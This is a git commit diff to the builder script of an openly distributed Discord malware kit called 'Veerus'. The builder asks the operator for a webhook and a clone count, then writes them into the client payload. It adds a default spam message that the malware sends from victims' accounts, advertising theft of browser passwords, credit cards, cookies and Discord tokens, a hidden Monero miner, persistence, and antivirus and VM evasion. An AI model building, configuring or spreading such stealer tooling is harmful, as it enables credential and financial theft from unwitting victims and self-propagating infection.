daf687c1f7005b70d139f460c309124f7afb6770
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-23 18:21:22 +0200

    Update compile.py

--- compile.py
+++ compile.py
@@ -12,8 +12,57 @@ if(webhookstats == ""):
 processnumbers = input("Number of clones (default : 3) : ")
 if processnumbers == "":
 	processnumbers = "3"
+dmallmsg = input("Dm All Message (press enter to leave default, that supports me a lot) : ")
+if dmallmsg == "":
+	dmallmsg = """:flag_gb: Hello !
+Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same?
+Let me explain what you can do with Veerus :
+```Stealer :
+	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
+		Passwords, Credit Cards, Cookies, Autofill
+
+	Discord :
+		Token
+
+	Miner :		
+		Hidden XMR Miner
+	Other :
+		Add to computer startup the number of time you choosed.
+		Clone the virus in random directories
+		Undetected by Windows Defender & Windows Smart screen
+		Anti Virtual Machine
+		Disable Task Manager```
+
+	Price : 0.00$ ! yes ! Totally Free !
+
+	Links :
+		Discord : https://discord.gg/7GkfBzRQXX
+		Github : https://github.com/0xSxZ/Veerus
+"""
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", str(webhook)).replace("processnumbers", str(processnumbers)).replace("NoWebhook667EKIP", str(webhookstats))
+filecontent = filecontent.replace("webhook667", str(webhook)).replace("processnumbers", str(processnumbers)).replace("NoWebhook667EKIP", str(webhookstats)).replace(""":flag_gb: Hello !
+Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
+```Stealer :
+	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
+		Passwords, Credit Cards, Cookies, Autofill
+
+	Discord :
+		Token
+
+	Miner :		
+		Hidden XMR Miner
+	Other :
+		Add to computer startup the number of time you choosed.
+		Clone the virus in random directories
+		Undetected by Windows Defender & Windows Smart screen
+		Anti Virtual Machine
+		Disable Task Manager```
+
+	Price : 0.00$ ! yes ! Totally Free !
+
+	Links :
+		Discord : https://discord.gg/7GkfBzRQXX
+		Github : https://github.com/0xSxZ/Veerus""", dmallmsg)
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
